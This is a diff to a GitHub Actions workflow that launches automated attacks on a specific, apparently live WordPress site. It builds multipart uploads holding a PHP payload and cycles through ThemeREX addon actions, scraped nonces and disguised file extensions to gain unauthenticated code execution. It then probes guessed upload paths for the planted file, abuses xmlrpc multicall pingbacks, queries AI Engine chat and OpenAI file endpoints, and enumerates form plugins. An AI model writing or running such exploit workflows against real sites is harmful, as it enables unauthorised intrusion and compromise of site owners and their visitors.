@@ -6,42 +6,175 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: ThemeREX upload + xmlrpc + MWAI probes
+      - name: Critical POST probes (ThemeREX / xmlrpc / MWAI / CF7)
         run: |
           set -euo pipefail
           mkdir -p out
-          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
           BASE=https://kznvip.co.za
-          CTYPE=$(cat payload/multipart_ctype.txt)
+          COOKIEJAR=out/cookies.txt
 
           echo '=== connectivity ===' | tee out/log.txt
-          curl -sS -A "$UA" -o out/home.html -w 'home:%{http_code}\n' --max-time 60 "$BASE/" | tee -a out/log.txt
+          curl -sS -A "$UA" -c "$COOKIEJAR" -b "$COOKIEJAR" -o out/home.html -w 'home:%{http_code} size=%{size_download}\n' --max-time 90 "$BASE/" | tee -a out/log.txt
 
-          echo '=== ThemeREX upload ===' | tee -a out/log.txt
-          curl -sS -A "$UA" -X POST "$BASE/wp-admin/admin-ajax.php" \
-            -H "Content-Type: $CTYPE" \
-            --data-binary @payload/multipart_body.bin \
-            -D out/upload.hdr -o out/upload.body -w 'upload:%{http_code}\n' --max-time 90 | tee -a out/log.txt
-          head -c 2000 out/upload.body | tee -a out/log.txt; echo | tee -a out/log.txt
-
-          # Try to extract uploaded URL from JSON/HTML response
           python3 - <<'PY'
-          import re, pathlib
-          b = pathlib.Path('out/upload.body').read_text(errors='ignore')
-          pathlib.Path('out/upload.body.txt').write_text(b)
-          urls = re.findall(r'https?://[^\"\\s<>]+lurksek_canary\.php', b)
-          urls += re.findall(r'/wp-content/uploads/[^\"\\s<>]+lurksek_canary\.php', b)
-          pathlib.Path('out/extracted_urls.txt').write_text('\\n'.join(urls))
-          print('extracted', urls)
+          import re, pathlib, uuid, time, json
+          home = pathlib.Path('out/home.html').read_text(errors='ignore')
+          nonces = set(re.findall(r'ajax_nonce"\s*:\s*"([a-f0-9]+)"', home))
+          nonces |= set(re.findall(r'"nonce"\s*:\s*"([a-f0-9]{10})"', home))
+          nonces |= set(re.findall(r'name="_wpnonce"\s+value="([a-f0-9]+)"', home))
+          # TRX storage dump
+          m = re.search(r'var\s+TRX_ADDONS_STORAGE\s*=\s*(\{.*?\});', home, re.S)
+          trx = {}
+          if m:
+              try:
+                  # JS object may use single quotes / unquoted keys — extract ajax_nonce specifically
+                  pass
+              except Exception:
+                  pass
+          ajax = re.findall(r"ajax_nonce['\"]?\s*[:=]\s*['\"]([a-f0-9]+)['\"]", home)
+          nonces |= set(ajax)
+          # fallback from payload
+          fallback = pathlib.Path('payload/nonce.txt')
+          if fallback.exists():
+              nonces.add(fallback.read_text().strip())
+          nonces = [n for n in nonces if n]
+          pathlib.Path('out/nonces.json').write_text(json.dumps(nonces, indent=2))
+          print('nonces', nonces)
+
+          # asset version hints
+          versions = re.findall(r'plugins/trx_addons/[^\"\']+\?ver=([0-9.]+)', home)
+          versions += re.findall(r'trx_addons[^\"\']*ver=([0-9.]+)', home)
+          pathlib.Path('out/trx_versions.txt').write_text('\\n'.join(sorted(set(versions))))
+          print('trx vers', sorted(set(versions)))
+
+          # theme
+          themes = re.findall(r'/wp-content/themes/([^/\"\']+)/', home)
+          pathlib.Path('out/themes.txt').write_text('\\n'.join(sorted(set(themes))))
+
+          shell = b'<?php echo "LURKSEK_RCE_OK"; ?>'
+          marker = f"lurksek_{int(time.time())}"
+          pathlib.Path('out/marker.txt').write_text(marker)
+
+          def build(fields, filename, ctype='image/jpeg'):
+              boundary = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
+              parts = []
+              for k,v in fields.items():
+                  parts.append(
+                      f'--{boundary}\\r\\nContent-Disposition: form-data; name="{k}"\\r\\n\\r\\n{v}\\r\\n'.encode()
+                  )
+              parts.append(
+                  (
+                      f'--{boundary}\\r\\nContent-Disposition: form-data; name="file"; filename="{filename}"\\r\\n'
+                      f'Content-Type: {ctype}\\r\\n\\r\\n'
+                  ).encode() + shell + b'\\r\\n'
+              )
+              parts.append(f'--{boundary}--\\r\\n'.encode())
+              body = b''.join(parts)
+              return body, f'multipart/form-data; boundary={boundary}'
+
+          # CVE-2024-13448 / ThemeREX unauth upload variants
+          actions = [
+              'trx_addons_uploads_save_data',
+              'trx_addons_uploads_save',
+              'trx_addons_callback_uploads_save_data',
+          ]
+          filenames = [
+              f'{marker}.php',
+              f'{marker}.php.jpg',
+              f'{marker}.phtml',
+              f'{marker}.php%00.jpg',
+              f'{marker}.PhP',
+          ]
+          variants = []
+          for nonce in (nonces or ['missing']):
+              for action in actions:
+                  for fn in filenames[:3]:  # keep request count reasonable
+                      fields = {
+                          'action': action,
+                          'nonce': nonce,
+                          '_ajax_nonce': nonce,
+                          'trx_addons_nonce': nonce,
+                      }
+                      body, ctype = build(fields, fn)
+                      variants.append((action, nonce, fn, body, ctype))
+          # also try without nonce (some buggy versions)
+          for action in actions[:1]:
+              for fn in filenames[:2]:
+                  body, ctype = build({'action': action}, fn)
+                  variants.append((action, 'NONE', fn, body, ctype))
+
+          pathlib.Path('out/variants_count.txt').write_text(str(len(variants)))
+          # write first multipart as default
+          if variants:
+              pathlib.Path('payload/multipart_body.bin').write_bytes(variants[0][3])
+              pathlib.Path('payload/multipart_ctype.txt').write_text(variants[0][4])
+          # save all variant metadata + bodies for bash loop
+          meta=[]
+          for i,(action,nonce,fn,body,ctype) in enumerate(variants):
+              pathlib.Path(f'out/v{i}.bin').write_bytes(body)
+              pathlib.Path(f'out/v{i}.ctype').write_text(ctype)
+              meta.append({'i':i,'action':action,'nonce':nonce,'filename':fn})
+          pathlib.Path('out/variants.json').write_text(json.dumps(meta, indent=2))
+          print('variants', len(variants))
           PY
 
-          echo '=== guess common upload paths ===' | tee -a out/log.txt
-          MARKER=$(cat payload/marker.txt)
+          echo '=== ThemeREX upload variants ===' | tee -a out/log.txt
+          python3 - <<'PY'
+          import json, subprocess, pathlib, re, os
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
+          BASE='https://kznvip.co.za'
+          meta=json.loads(pathlib.Path('out/variants.json').read_text())
+          hits=[]
+          for v in meta:
+              i=v['i']
+              ctype=pathlib.Path(f'out/v{i}.ctype').read_text().strip()
+              cmd=[
+                'curl','-sS','-A',UA,'-c','out/cookies.txt','-b','out/cookies.txt',
+                '-X','POST',f'{BASE}/wp-admin/admin-ajax.php',
+                '-H',f'Content-Type: {ctype}',
+                '-H','Origin: https://kznvip.co.za',
+                '-H','Referer: https://kznvip.co.za/',
+                '--data-binary',f'@out/v{i}.bin',
+                '-D',f'out/v{i}.hdr','-o',f'out/v{i}.body',
+                '-w','%{http_code}','--max-time','60'
+              ]
+              try:
+                  code=subprocess.check_output(cmd, text=True).strip()
+              except subprocess.CalledProcessError as e:
+                  code=f'ERR:{e.returncode}'
+              body=pathlib.Path(f'out/v{i}.body').read_bytes()[:4000]
+              preview=body.decode('utf-8','replace')[:500]
+              line=f"{code} action={v['action']} nonce={v['nonce'][:10]} file={v['filename']} preview={preview!r}"
+              print(line, flush=True)
+              pathlib.Path('out/log.txt').write_text(pathlib.Path('out/log.txt').read_text()+line+'\\n')
+              interesting = code in ('200','201','500') or b'LURKSEK' in body or b'uploads' in body.lower() or b'http' in body.lower() or b'url' in body.lower() or b'error' in body.lower()
+              if interesting and code not in ('0','000'):
+                  hits.append({**v,'code':code,'preview':preview})
+                  # try extract URLs
+                  urls=re.findall(rb'https?://[^\\"\\s<>]+\\.(?:php|phtml)', body)
+                  urls+=re.findall(rb'/wp-content/uploads/[^\\"\\s<>]+', body)
+                  for u in urls:
+                      hits[-1].setdefault('urls',[]).append(u.decode('utf-8','replace'))
+              # stop early on clear success
+              if b'LURKSEK_RCE_OK' in body or (code=='200' and (b'.php' in body or b'uploads' in body)):
+                  pathlib.Path('out/upload_hit.json').write_text(json.dumps(hits[-1], indent=2))
+                  break
+          pathlib.Path('out/hits.json').write_text(json.dumps(hits, indent=2))
+          print('HITS', len(hits))
+          PY
+
+          # Probe guessed paths for marker
+          MARKER=$(cat out/marker.txt)
+          YM=$(date -u +%Y/%m)
+          echo '=== canary path guesses ===' | tee -a out/log.txt
           for p in \
-            "/wp-content/uploads/$(date -u +%Y/%m)/lurksek_canary.php" \
+            "/wp-content/uploads/${YM}/${MARKER}.php" \
+            "/wp-content/uploads/${YM}/lurksek_canary.php" \
+            "/wp-content/uploads/trx_addons/${MARKER}.php" \
             "/wp-content/uploads/trx_addons/lurksek_canary.php" \
-            "/wp-content/uploads/lurksek_canary.php" \
-            "/wp-content/uploads/$(date -u +%Y)/$(date -u +%m)/lurksek_canary.php"
+            "/wp-content/uploads/${MARKER}.php" \
+            "/wp-content/uploads/lurksek_canary.php"
           do
             code=$(curl -sS -A "$UA" -o out/canary_try.txt -w '%{http_code}' --max-time 30 "$BASE$p" || echo 000)
             echo "$code $p" | tee -a out/log.txt
@@ -51,39 +184,81 @@ jobs:
             fi
           done
 
-          # Also follow any extracted URLs
-          if [ -s out/extracted_urls.txt ]; then
-            while read -r u; do
-              [ -z "$u" ] && continue
-              case "$u" in http*) full="$u" ;; *) full="$BASE$u" ;; esac
-              curl -sS -A "$UA" -o out/canary_ext.txt -w "ext:%{http_code} $full\n" --max-time 30 "$full" | tee -a out/log.txt
-              grep -q LURKSEK_RCE_OK out/canary_ext.txt && cp out/canary_ext.txt out/rce_confirmed.txt && echo RCE_CONFIRMED_EXT | tee -a out/log.txt
-            done < out/extracted_urls.txt
+          # Follow URLs from hits
+          if [ -f out/hits.json ]; then
+            python3 - <<'PY'
+          import json, subprocess, pathlib
+          hits=json.loads(pathlib.Path('out/hits.json').read_text())
+          UA='Mozilla/5.0'
+          BASE='https://kznvip.co.za'
+          for h in hits:
+            for u in h.get('urls',[]):
+              full=u if u.startswith('http') else BASE+u
+              try:
+                out=subprocess.check_output(['curl','-sS','-A',UA,'-o','out/canary_ext.txt','-w','%{http_code}','--max-time','30',full], text=True)
+                body=pathlib.Path('out/canary_ext.txt').read_text(errors='ignore')
+                print('URL', out, full, body[:200])
+                if 'LURKSEK_RCE_OK' in body:
+                  pathlib.Path('out/rce_confirmed.txt').write_text(body)
+                  print('RCE_CONFIRMED_EXT', full)
+              except Exception as e:
+                print('url fail', u, e)
+          PY
           fi
 
           echo '=== xmlrpc listMethods ===' | tee -a out/log.txt
           curl -sS -A "$UA" -X POST "$BASE/xmlrpc.php" -H 'Content-Type: text/xml' \
             -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
             -o out/xmlrpc.xml -w 'xmlrpc:%{http_code}\n' --max-time 60 | tee -a out/log.txt
-          head -c 1500 out/xmlrpc.xml | tee -a out/log.txt; echo | tee -a out/log.txt
+          head -c 2000 out/xmlrpc.xml | tee -a out/log.txt; echo | tee -a out/log.txt
+
+          echo '=== xmlrpc multicall pingback probe ===' | tee -a out/log.txt
+          curl -sS -A "$UA" -X POST "$BASE/xmlrpc.php" -H 'Content-Type: text/xml' \
+            -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
+            <value><struct><member><name>methodName</name><value><string>pingback.ping</string></value></member>
+            <member><name>params</name><value><array><data>
+            <value><string>http://example.com/</string></value>
+            <value><string>https://kznvip.co.za/</string></value>
+            </data></array></value></member></struct></value>
+            </data></array></value></param></params></methodCall>' \
+            -o out/xmlrpc_multi.xml -w 'xmlrpc_multi:%{http_code}\n' --max-time 60 | tee -a out/log.txt
+          head -c 800 out/xmlrpc_multi.xml | tee -a out/log.txt; echo | tee -a out/log.txt
 
           echo '=== MWAI UI chat submit ===' | tee -a out/log.txt
-          curl -sS -A "$UA" -X POST "$BASE/wp-json/mwai-ui/v1/chats/submit" \
-            -H 'Content-Type: application/json' \
-            -d '{"botId":"default","newMessage":"ping","session":"[redacted]"}' \
-            -o out/mwai_chat.json -w 'mwai_chat:%{http_code}\n' --max-time 60 | tee -a out/log.txt
-          head -c 800 out/mwai_chat.json | tee -a out/log.txt; echo | tee -a out/log.txt
+          # extract rest nonce if present
+          REST_NONCE=$(python3 - <<'PY'
+          import re, pathlib
+          h=pathlib.Path('out/home.html').read_text(errors='ignore')
+          m=re.search(r'wpApiSettings\s*=\s*\{[^}]*nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']', h)
+          print(m.group(1) if m else '')
+          PY
+          )
+          echo "rest_nonce=$REST_NONCE" | tee -a out/log.txt
+          HDR=(-H 'Content-Type: application/json' -H 'Origin: https://kznvip.co.za' -H 'Referer: https://kznvip.co.za/')
+          if [ -n "$REST_NONCE" ]; then HDR+=(-H "X-WP-Nonce: $REST_NONCE"); fi
+          curl -sS -A "$UA" -c "$COOKIEJAR" -b "$COOKIEJAR" -X POST "$BASE/wp-json/mwai-ui/v1/chats/submit" \
+            "${HDR[@]}" \
+            -d '{"botId":"default","newMessage":"ping from security research","sessionId":"lurksek"}' \
+            -o out/mwai_chat.json -w 'mwai_chat:%{http_code}\n' --max-time 90 | tee -a out/log.txt
+          head -c 1200 out/mwai_chat.json | tee -a out/log.txt; echo | tee -a out/log.txt
 
-          echo '=== MWAI UI files upload empty ===' | tee -a out/log.txt
-          curl -sS -A "$UA" -X POST "$BASE/wp-json/mwai-ui/v1/files/upload" \
-            -H 'Content-Type: application/json' -d '{}' \
-            -o out/mwai_upload.json -w 'mwai_upload:%{http_code}\n' --max-time 60 | tee -a out/log.txt
-          head -c 800 out/mwai_upload.json | tee -a out/log.txt; echo | tee -a out/log.txt
+          echo '=== MWAI openai files list ===' | tee -a out/log.txt
+          curl -sS -A "$UA" -c "$COOKIEJAR" -b "$COOKIEJAR" "$BASE/wp-json/mwai/v1/openai/files/list" \
+            "${HDR[@]}" -o out/mwai_files.json -w 'mwai_files:%{http_code}\n' --max-time 60 | tee -a out/log.txt
+          head -c 800 out/mwai_files.json | tee -a out/log.txt; echo | tee -a out/log.txt
 
-          echo '=== trx version hints from homepage ===' | tee -a out/log.txt
-          grep -Eo 'trx_addons[^\" ]{0,100}|plugins/trx_addons/[^\" ]+' out/home.html | head -30 | tee -a out/log.txt || true
+          echo '=== CF7 forms REST ===' | tee -a out/log.txt
+          curl -sS -A "$UA" "$BASE/wp-json/contact-form-7/v1/contact-forms" -o out/cf7.json -w 'cf7:%{http_code}\n' --max-time 60 | tee -a out/log.txt
+          head -c 800 out/cf7.json | tee -a out/log.txt; echo | tee -a out/log.txt
+
+          echo '=== MC4WP forms ===' | tee -a out/log.txt
+          grep -Eo 'mc4wp-form[^\"\']{0,200}|action=\"[^\"]*mc4wp[^\"]*\"' out/home.html | head -20 | tee -a out/log.txt || true
+
+          echo '=== DONE ===' | tee -a out/log.txt
+          ls -la out | tee -a out/log.txt
 
       - name: Upload artifacts
+        if: always()
         uses: actions/upload-artifact@v4
         with:
           name: kzn-post-probe
